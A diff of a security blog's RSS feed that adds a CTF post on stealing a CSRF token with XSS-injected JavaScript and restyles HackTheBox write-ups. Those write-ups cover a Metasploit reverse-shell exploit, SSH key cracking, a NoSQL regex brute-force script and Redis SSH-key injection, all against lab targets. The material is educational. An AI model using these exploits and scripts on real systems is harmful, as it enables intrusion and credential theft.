@@ -4,8 +4,39 @@
         <link>https://ajdintrejic.github.io/posts/</link>
         <description>Recent content in Posts on ajdintrejic</description>
         <generator>Hugo -- gohugo.io</generator>
-        <lastBuildDate>Sat, 02 May 2020 09:03:27 +0200</lastBuildDate>
+        <lastBuildDate>Thu, 07 May 2020 00:43:19 +0200</lastBuildDate>
         <atom:link href="https://ajdintrejic.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>CSRF :: Bypass token with XSS</title>
+            <link>https://ajdintrejic.github.io/posts/2020/05/csrf-bypass-token-with-xss/</link>
+            <pubDate>Thu, 07 May 2020 00:43:19 +0200</pubDate>
+            
+            <guid>https://ajdintrejic.github.io/posts/2020/05/csrf-bypass-token-with-xss/</guid>
+            <description>So I was doing a CTF challenge and I have learned how to bypass CSRF token protection with extracting the token. I had to remove the CSRF code as the CTF forbids leaking solutions.
+&amp;lt;form action=&amp;#34;&amp;lt;url goes here&amp;gt;&amp;#34; method=&amp;#34;post&amp;#34; name=&amp;#34;csrf&amp;#34; enctype=&amp;#34;multipart/form-data&amp;#34;&amp;gt; &amp;lt;input ... /&amp;gt; &amp;lt;input id=&amp;#34;token&amp;#34; type=&amp;#34;hidden&amp;#34; name=&amp;#34;token&amp;#34; value=&amp;#34;&amp;#34; /&amp;gt; &amp;lt;button type=&amp;#34;submit&amp;#34;&amp;gt;Submit&amp;lt;/button&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;script&amp;gt; xhttp = new XMLHttpRequest(); xhttp.open(&amp;#34;GET&amp;#34;, &amp;#34;http://challenge01.root-me.org/web-client/ch23/?action=profile&amp;#34;, false); xhttp.send(); token_admin = (xhttp.responseText.match(/[abcdef0123456789]{32}/)); document.getElementById(&amp;#39;token&amp;#39;).setAttribute(&amp;#39;value&amp;#39;, token_admin) document.csrf_form.submit(); &amp;lt;/script&amp;gt; What is this token?</description>
+            <content type="html"><![CDATA[<p>So I was doing a CTF challenge and I have learned how to bypass CSRF token protection with extracting the token. I had to remove the CSRF code as the CTF forbids leaking solutions.</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">&lt;form action=<span style="color:#ed9d13">&#34;&lt;url goes here&gt;&#34;</span> method=<span style="color:#ed9d13">&#34;post&#34;</span> name=<span style="color:#ed9d13">&#34;csrf&#34;</span> enctype=<span style="color:#ed9d13">&#34;multipart/form-data&#34;</span>&gt;
+                &lt;input ... /&gt;
+                &lt;input id=<span style="color:#ed9d13">&#34;token&#34;</span> type=<span style="color:#ed9d13">&#34;hidden&#34;</span> name=<span style="color:#ed9d13">&#34;token&#34;</span> value=<span style="color:#ed9d13">&#34;&#34;</span> /&gt;
+                &lt;button type=<span style="color:#ed9d13">&#34;submit&#34;</span>&gt;Submit&lt;<span style="color:#a61717;background-color:#e3d2d2">/button&gt;</span>
+&lt;<span style="color:#a61717;background-color:#e3d2d2">/form&gt;</span>
+
+&lt;script&gt;
+                xhttp = <span style="color:#6ab825;font-weight:bold">new</span> XMLHttpRequest();
+                xhttp.open(<span style="color:#ed9d13">&#34;GET&#34;</span>, <span style="color:#ed9d13">&#34;http://challenge01.root-me.org/web-client/ch23/?action=profile&#34;</span>, <span style="color:#6ab825;font-weight:bold">false</span>);
+                xhttp.send();
+
+                token_admin = (xhttp.responseText.match(<span style="color:#ed9d13">/[abcdef0123456789]{32}/</span>));
+
+                <span style="color:#24909d">document</span>.getElementById(<span style="color:#ed9d13">&#39;token&#39;</span>).setAttribute(<span style="color:#ed9d13">&#39;value&#39;</span>, token_admin)
+
+                <span style="color:#24909d">document</span>.csrf_form.submit();
+&lt;<span style="color:#a61717;background-color:#e3d2d2">/script&gt;</span>
+</code></pre></div><p>What is this token? Well one way to protect your site from CSRF attacks it to use tokens to validate if the request is being authentic, so we have to switch our token with victims token.</p>
+<p>So how does this work? The code is pretty easy to read. This code inside the <code>&lt;script&gt;</code> tag is executed on our victims machine, and it loads a new <code>HTTP</code> request, finds the token using regular expressions and replaces it. Now our form has a valid token and we can submit it.</p>
+]]></content>
+        </item>
         
         <item>
             <title>HackTheBox :: Openadmin Write Up</title>
@@ -18,19 +49,19 @@ nmap -sC -sV -O -oA nmap/initial 10.10.10.171 -sC: run default script scan -sV: 
             <content type="html"><![CDATA[<p><img src="/htb-openadmin/info_card.png" alt="info card"></p>
 <h2 id="reconnaissance">Reconnaissance</h2>
 <p>Let&rsquo;s see what have we got here with nmap.</p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -sC -sV -O -oA nmap/initial 10.10.10.171
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -sC -sV -O -oA nmap/initial 10.10.10.171
 </code></pre></div><pre><code>-sC: run default script scan
 -sV: probe open ports to determine service/version info
 -O: OS detection
 -oA: output OS detection, version detection, script scanning, and traceroute 
 </code></pre><p>Nmap returns the results quick as it by default scans only for most popular 1000 ports, so lets scan all the ports while we investigate the initial nmap scan.</p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -sC -sV -O -p- -oA nmap/full 10.10.10.171
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -sC -sV -O -p- -oA nmap/full 10.10.10.171
 </code></pre></div><pre><code>-p-: scans from port 1 to 65535, same as -p1-65535
 </code></pre><p><img src="/htb-openadmin/nmap_initial.png" alt="namp initial"></p>
 <p>Let&rsquo;s look at the http server.</p>
 <p><img src="/htb-openadmin/http_server.png" alt="http server"></p>
 <p>The page has the default Apache 2 page, so let&rsquo;s fire up gobuster. </p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.171 -x php,html -t <span style="color:#ff0;font-weight:bold">100</span>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.171 -x php,html -t <span style="color:#3677a9">100</span>
 </code></pre></div><pre><code>-w: use a wordlist
 -u: target url
 -x: search for extensions
@@ -43,12 +74,12 @@ nmap -sC -sV -O -oA nmap/initial 10.10.10.171 -sC: run default script scan -sV: 
 <h3 id="exploiting-opennetadmin-with-command-injection-exploit">Exploiting OpenNetAdmin with command injection exploit</h3>
 <p><img src="/htb-openadmin/searchsploit.png" alt="searchsploit"></p>
 <p>So we have a exploit for the exact version which this server is running. We can copy <code>47772.rb</code> into Metasploit. If you&rsquo;re importing exploits into Metasploit you should run <code>reload_all</code> in msfconsole after <code>cp</code> the package.</p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">searchsploit -m exploits/php/webapps/47772.rb
-</code></pre></div><div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cp 47772.rb /usr/share/metasploit-framework/modules/exploits/linux/http/
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">searchsploit -m exploits/php/webapps/47772.rb
+</code></pre></div><div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cp 47772.rb /usr/share/metasploit-framework/modules/exploits/linux/http/
 </code></pre></div><p>After the modules have been reloaded we can use the exploit. Make sure to configure everything.</p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#fff;font-weight:bold">set</span> lhost &lt;your ip, run <span style="color:#0ff;font-weight:bold">&#34;ip addr&#34;</span> to find it&gt;
-<span style="color:#fff;font-weight:bold">set</span> rhost 10.10.10.171
-<span style="color:#fff;font-weight:bold">set</span> payload linux/x64/shell_reverse_tcp
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#24909d">set</span> lhost &lt;your ip, run <span style="color:#ed9d13">&#34;ip addr&#34;</span> to find it&gt;
+<span style="color:#24909d">set</span> rhost 10.10.10.171
+<span style="color:#24909d">set</span> payload linux/x64/shell_reverse_tcp
 </code></pre></div><p>After using this payload we get a shell as www-data. You can see who you are with <code>whoami</code>.</p>
 <p><img src="/htb-openadmin/www_data_shell.png" alt="www data shell"></p>
 <h3 id="privilege-escalation-with-db-password">Privilege escalation with db password</h3>
@@ -62,25 +93,25 @@ nmap -sC -sV -O -oA nmap/initial 10.10.10.171 -sC: run default script scan -sV: 
 <h3 id="wierd-server-on-localhost">Wierd server on localhost</h3>
 <p><img src="/htb-openadmin/main_php.png" alt="main php"></p>
 <p>So if we can access the server it will output us the ssh private key for joanna. Amazing, but how do we access that? Let&rsquo;s run netstat</p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">netstat -lt 
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">netstat -lt 
 </code></pre></div><pre><code>-l: listening connections
 -t: TCP connections
 </code></pre><p><img src="/htb-openadmin/n2.png" alt="netstat"></p>
 <p>So we have an unusual port 52846 listening on localhost. We can curl from ssh as we can&rsquo;t access this from the browser. </p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl localhost:52846
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl localhost:52846
 </code></pre></div><p><img src="/htb-openadmin/curl_1.png" alt="curl"></p>
 <p>We&rsquo;ve got a webpage, let&rsquo;s access that main.php file from before.</p>
 <p><img src="/htb-openadmin/curl_2.png" alt="curl"></p>
 <h3 id="cracking-the-hash-with-john">Cracking the hash with John</h3>
 <p>Now we have the <code>id_rsa</code> key for joanna we have to decrypt it, so we can get the password for the private key. Copy the key on your machine and save it as <code>id_rsa</code>, and copy the <code>ssh2john</code> script so we can use john on this key.</p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kali@kali:~/openadmin$ cp /usr/share/john/ssh2john.py .
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kali@kali:~/openadmin$ cp /usr/share/john/ssh2john.py .
 </code></pre></div><p>Pipe the output to a file:</p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kali@kali:~/openadmin$ ./ssh2john.py id_rsa &gt; hash.txt
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kali@kali:~/openadmin$ ./ssh2john.py id_rsa &gt; hash.txt
 </code></pre></div><p><img src="/htb-openadmin/john.png" alt="john"></p>
 <p>We have the password. <code>bloodninjas</code>, now let&rsquo;s connect as Joanna.</p>
 <p><img src="/htb-openadmin/ssh_joanna.png" alt="ssh Joanna"></p>
 <p>from here we can cat <code>user.txt</code> and we have got the user flag.</p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">joanna@openadmin:~$ cat user.txt
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">joanna@openadmin:~$ cat user.txt
 c9b2c...
 </code></pre></div><h2 id="getting-root">Getting root</h2>
 <p>Getting root is fairly easy. Each time you log into an user, try running <code>sudo -l</code> so you can see if something can be ran as root, and exploited to gain a shell. Luckily we do have a command we can run as root.</p>
@@ -90,7 +121,7 @@ c9b2c...
 <h3 id="privilege-escalation-with-nano">Privilege escalation with Nano</h3>
 <p><img src="/htb-openadmin/nano.png" alt="nano"></p>
 <p>You might get confused as the first few commands will overwrite nano&rsquo;s interface but just navigate to root.txt</p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ whoami 
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ whoami 
 root
 $ cat /root/root.txt
 2f907...
@@ -144,43 +175,43 @@ staging-order.mango.htb</p>
 <h3 id="bruteforcing-the-password">Bruteforcing the password</h3>
 <p>We can’t do anything from the webpage so I tried to brute-force the password. <a href="https://book.hacktricks.xyz/pentesting-web/nosql-injection#brute-force-login-usernames-and-passwords-from-post-login">Here</a> I have found a nice script. It uses regular expressions to try to match the password. The code is fairly simple so I won’t be explaining that.</p>
 <p>You should change the cookie ID.</p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#fff;font-weight:bold">import</span> requests
-<span style="color:#fff;font-weight:bold">import</span> stringurl = <span style="color:#0ff;font-weight:bold">&#34;http://example.com&#34;</span>
-headers = {<span style="color:#0ff;font-weight:bold">&#34;Host&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;exmaple.com&#34;</span>}
-cookies = {<span style="color:#0ff;font-weight:bold">&#34;PHPSESSID&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;s3gcsgtqre05bah2vt6tibq8lsdfk&#34;</span>}
-possible_chars = <span style="color:#fff;font-weight:bold">list</span>(string.ascii_letters) + <span style="color:#fff;font-weight:bold">list</span>(string.digits) + [<span style="color:#0ff;font-weight:bold">&#34;</span><span style="color:#0ff;font-weight:bold">\\</span><span style="color:#0ff;font-weight:bold">&#34;</span>+c <span style="color:#fff;font-weight:bold">for</span> c in string.punctuation+string.whitespace ]<span style="color:#fff;font-weight:bold">def</span> get_password(username):
-    <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">&#34;Extracting password of &#34;</span>+username)
-    params = {<span style="color:#0ff;font-weight:bold">&#34;username&#34;</span>:username, <span style="color:#0ff;font-weight:bold">&#34;password[$regex]&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;login&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;login&#34;</span>}
-    password = <span style="color:#0ff;font-weight:bold">&#34;^&#34;</span>
-    <span style="color:#fff;font-weight:bold">while</span> True:
-        <span style="color:#fff;font-weight:bold">for</span> c in possible_chars:
-            params[<span style="color:#0ff;font-weight:bold">&#34;password[$regex]&#34;</span>] = password + c + <span style="color:#0ff;font-weight:bold">&#34;.*&#34;</span>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">requests</span>
+<span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">stringurl</span> = <span style="color:#ed9d13">&#34;http://example.com&#34;</span>
+headers = {<span style="color:#ed9d13">&#34;Host&#34;</span>: <span style="color:#ed9d13">&#34;exmaple.com&#34;</span>}
+cookies = {<span style="color:#ed9d13">&#34;PHPSESSID&#34;</span>: <span style="color:#ed9d13">&#34;s3gcsgtqre05bah2vt6tibq8lsdfk&#34;</span>}
+possible_chars = <span style="color:#24909d">list</span>(string.ascii_letters) + <span style="color:#24909d">list</span>(string.digits) + [<span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\\</span><span style="color:#ed9d13">&#34;</span>+c <span style="color:#6ab825;font-weight:bold">for</span> c <span style="color:#6ab825;font-weight:bold">in</span> string.punctuation+string.whitespace ]<span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">get_password</span>(username):
+    <span style="color:#6ab825;font-weight:bold">print</span>(<span style="color:#ed9d13">&#34;Extracting password of &#34;</span>+username)
+    params = {<span style="color:#ed9d13">&#34;username&#34;</span>:username, <span style="color:#ed9d13">&#34;password[$regex]&#34;</span>:<span style="color:#ed9d13">&#34;&#34;</span>, <span style="color:#ed9d13">&#34;login&#34;</span>: <span style="color:#ed9d13">&#34;login&#34;</span>}
+    password = <span style="color:#ed9d13">&#34;^&#34;</span>
+    <span style="color:#6ab825;font-weight:bold">while</span> True:
+        <span style="color:#6ab825;font-weight:bold">for</span> c <span style="color:#6ab825;font-weight:bold">in</span> possible_chars:
+            params[<span style="color:#ed9d13">&#34;password[$regex]&#34;</span>] = password + c + <span style="color:#ed9d13">&#34;.*&#34;</span>
             pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
-            <span style="color:#fff;font-weight:bold">if</span> <span style="color:#fff;font-weight:bold">int</span>(pr.status_code) == <span style="color:#ff0;font-weight:bold">302</span>:
+            <span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#24909d">int</span>(pr.status_code) == <span style="color:#3677a9">302</span>:
                 password += c
-                <span style="color:#fff;font-weight:bold">break</span>
-        <span style="color:#fff;font-weight:bold">if</span> c == possible_chars[-<span style="color:#ff0;font-weight:bold">1</span>]:
-            <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">&#34;Found password &#34;</span>+password[<span style="color:#ff0;font-weight:bold">1</span>:].replace(<span style="color:#0ff;font-weight:bold">&#34;</span><span style="color:#0ff;font-weight:bold">\\</span><span style="color:#0ff;font-weight:bold">&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;&#34;</span>)+<span style="color:#0ff;font-weight:bold">&#34; for username &#34;</span>+username)
-            <span style="color:#fff;font-weight:bold">return</span> password[<span style="color:#ff0;font-weight:bold">1</span>:].replace(<span style="color:#0ff;font-weight:bold">&#34;</span><span style="color:#0ff;font-weight:bold">\\</span><span style="color:#0ff;font-weight:bold">&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;&#34;</span>)<span style="color:#fff;font-weight:bold">def</span> get_usernames():
+                <span style="color:#6ab825;font-weight:bold">break</span>
+        <span style="color:#6ab825;font-weight:bold">if</span> c == possible_chars[-<span style="color:#3677a9">1</span>]:
+            <span style="color:#6ab825;font-weight:bold">print</span>(<span style="color:#ed9d13">&#34;Found password &#34;</span>+password[<span style="color:#3677a9">1</span>:].replace(<span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\\</span><span style="color:#ed9d13">&#34;</span>, <span style="color:#ed9d13">&#34;&#34;</span>)+<span style="color:#ed9d13">&#34; for username &#34;</span>+username)
+            <span style="color:#6ab825;font-weight:bold">return</span> password[<span style="color:#3677a9">1</span>:].replace(<span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\\</span><span style="color:#ed9d13">&#34;</span>, <span style="color:#ed9d13">&#34;&#34;</span>)<span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">get_usernames</span>():
     usernames = []
-    params = {<span style="color:#0ff;font-weight:bold">&#34;username[$regex]&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;password[$regex]&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;.*&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;login&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;login&#34;</span>}
-    <span style="color:#fff;font-weight:bold">for</span> c in possible_chars:
-        username = <span style="color:#0ff;font-weight:bold">&#34;^&#34;</span> + c
-        params[<span style="color:#0ff;font-weight:bold">&#34;username[$regex]&#34;</span>] = username + <span style="color:#0ff;font-weight:bold">&#34;.*&#34;</span>
+    params = {<span style="color:#ed9d13">&#34;username[$regex]&#34;</span>:<span style="color:#ed9d13">&#34;&#34;</span>, <span style="color:#ed9d13">&#34;password[$regex]&#34;</span>:<span style="color:#ed9d13">&#34;.*&#34;</span>, <span style="color:#ed9d13">&#34;login&#34;</span>: <span style="color:#ed9d13">&#34;login&#34;</span>}
+    <span style="color:#6ab825;font-weight:bold">for</span> c <span style="color:#6ab825;font-weight:bold">in</span> possible_chars:
+        username = <span style="color:#ed9d13">&#34;^&#34;</span> + c
+        params[<span style="color:#ed9d13">&#34;username[$regex]&#34;</span>] = username + <span style="color:#ed9d13">&#34;.*&#34;</span>
         pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
-        <span style="color:#fff;font-weight:bold">if</span> <span style="color:#fff;font-weight:bold">int</span>(pr.status_code) == <span style="color:#ff0;font-weight:bold">302</span>:
-            <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">&#34;Found username starting with &#34;</span>+c)
-            <span style="color:#fff;font-weight:bold">while</span> True:
-                <span style="color:#fff;font-weight:bold">for</span> c2 in possible_chars:
-                    params[<span style="color:#0ff;font-weight:bold">&#34;username[$regex]&#34;</span>] = username + c2 + <span style="color:#0ff;font-weight:bold">&#34;.*&#34;</span>
-                    <span style="color:#fff;font-weight:bold">if</span> <span style="color:#fff;font-weight:bold">int</span>(requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False).status_code) == <span style="color:#ff0;font-weight:bold">302</span>:
+        <span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#24909d">int</span>(pr.status_code) == <span style="color:#3677a9">302</span>:
+            <span style="color:#6ab825;font-weight:bold">print</span>(<span style="color:#ed9d13">&#34;Found username starting with &#34;</span>+c)
+            <span style="color:#6ab825;font-weight:bold">while</span> True:
+                <span style="color:#6ab825;font-weight:bold">for</span> c2 <span style="color:#6ab825;font-weight:bold">in</span> possible_chars:
+                    params[<span style="color:#ed9d13">&#34;username[$regex]&#34;</span>] = username + c2 + <span style="color:#ed9d13">&#34;.*&#34;</span>
+                    <span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#24909d">int</span>(requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False).status_code) == <span style="color:#3677a9">302</span>:
                         username += c2
-                        <span style="color:#fff;font-weight:bold">print</span>(username)
-                        breakif c2 == possible_chars[-<span style="color:#ff0;font-weight:bold">1</span>]:
-                    <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">&#34;Found username: &#34;</span>+username[<span style="color:#ff0;font-weight:bold">1</span>:])
-                    usernames.append(username[<span style="color:#ff0;font-weight:bold">1</span>:])
-                    <span style="color:#fff;font-weight:bold">break</span>
-    <span style="color:#fff;font-weight:bold">return</span> usernamesfor u in get_usernames():
+                        <span style="color:#6ab825;font-weight:bold">print</span>(username)
+                        breakif c2 == possible_chars[-<span style="color:#3677a9">1</span>]:
+                    <span style="color:#6ab825;font-weight:bold">print</span>(<span style="color:#ed9d13">&#34;Found username: &#34;</span>+username[<span style="color:#3677a9">1</span>:])
+                    usernames.append(username[<span style="color:#3677a9">1</span>:])
+                    <span style="color:#6ab825;font-weight:bold">break</span>
+    <span style="color:#6ab825;font-weight:bold">return</span> usernamesfor u <span style="color:#6ab825;font-weight:bold">in</span> get_usernames():
     get_password(u)
 </code></pre></div><p>This will run for some time, the output is:</p>
 <p><img src="/htb-mango/password_bruteforce.png" alt="success"></p>
@@ -213,7 +244,7 @@ While I wait for this to be finished I’ll start a full nmap scan.
 # nmap -sV -sC -O -p- -oA nmap/initial 10.10.10.160 As usual we have port 22 and port 80 running, but here we also have http protocol running on port 10000, let’s enumerate on those pages.</description>
             <content type="html"><![CDATA[<h2 id="reconnaissance">Reconnaissance</h2>
 <p>Let’s run a quick nmap scan as always.</p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#007f7f"># nmap -sV -sC -O -oA nmap/initial 10.10.10.160</span>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#999;font-style:italic"># nmap -sV -sC -O -oA nmap/initial 10.10.10.160</span>
 </code></pre></div><p>Short explanation:</p>
 <pre><code>-sV Version detection
 -sC Script scan
@@ -221,7 +252,7 @@ While I wait for this to be finished I’ll start a full nmap scan.
 -oA Output to all formats
 </code></pre><p>For a more detailed explanation <a href="https://explainshell.com/explain?cmd=nmap+-sV+-sC+-O+-oA+nmap%2Finitial+10.10.10.160#">click here</a>.</p>
 <p>While I wait for this to be finished I’ll start a full nmap scan.</p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#007f7f"># nmap -sV -sC -O -p- -oA nmap/initial 10.10.10.160</span>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#999;font-style:italic"># nmap -sV -sC -O -p- -oA nmap/initial 10.10.10.160</span>
 </code></pre></div><p><img src="/htb-postman/nmap_initial.png" alt="nmap initial"></p>
 <p>As usual we have port 22 and port 80 running, but here we also have http protocol running on port 10000, let’s enumerate on those pages.</p>
 <p><img src="/htb-postman/port80.png" alt="port80"></p>
@@ -229,7 +260,7 @@ While I wait for this to be finished I’ll start a full nmap scan.
 <p>Now on the second server I have to add a “s” to my http request so I can access that.</p>
 <p><img src="/htb-postman/port10000_2.png" alt="port80"></p>
 <p>I’ll also start up gobuster. On port 10000 every page link loads the same login so gobuster doesn’t help us there. Let’s run it on port 80.</p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.160 -x php,html -t <span style="color:#ff0;font-weight:bold">100</span>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.160 -x php,html -t <span style="color:#3677a9">100</span>
 </code></pre></div><p><img src="/htb-postman/gobuster.png" alt="gobuster"></p>
 <p>Now I felt kinda lost so I looked into what did the full nmap scan find.</p>
 <p><img src="/htb-postman/nmap_full.png" alt="nmap full"></p>
@@ -240,40 +271,40 @@ While I wait for this to be finished I’ll start a full nmap scan.
 <p>The Redis security model is: “it’s totally insecure to let untrusted clients access the system, please protect it from the outside world yourself”.</p>
 </blockquote>
 <p>So we’re on the right track. The developer guides us for the next steps on how to exploit this. Using <code>telnet</code> we can see now that we can connect to the machine easily:</p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ telnet 10.10.10.160 <span style="color:#ff0;font-weight:bold">6379</span>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ telnet 10.10.10.160 <span style="color:#3677a9">6379</span>
 </code></pre></div><p>We don’t have a real shell here but we can write some files. We’ll write our own ssh keys. Let’s generate them.</p>
 <p><img src="/htb-postman/ssh_keygen.png" alt="nmap full"></p>
 <p>We will push the key and pad it before and after. Why? Well we’ll push it to Redis memory and then flush the memory to a file. The memory will contain a lot of garbage and we’re hoping ssh will parse the file, ignore the garbage and correctly read our key.</p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ (<span style="color:#fff;font-weight:bold">echo</span> -e <span style="color:#0ff;font-weight:bold">&#34;\n\n&#34;</span>; cat id_rsa.pub; <span style="color:#fff;font-weight:bold">echo</span> -e <span style="color:#0ff;font-weight:bold">&#34;\n\n&#34;</span>) &gt; foo.txt
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ (<span style="color:#24909d">echo</span> -e <span style="color:#ed9d13">&#34;\n\n&#34;</span>; cat id_rsa.pub; <span style="color:#24909d">echo</span> -e <span style="color:#ed9d13">&#34;\n\n&#34;</span>) &gt; foo.txt
 </code></pre></div><p>Now foo.txt is just our public key but with newlines. We can write this string inside the memory of Redis using <code>redis-cli</code>:</p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ redis-cli -h 10.10.10.160 flushall
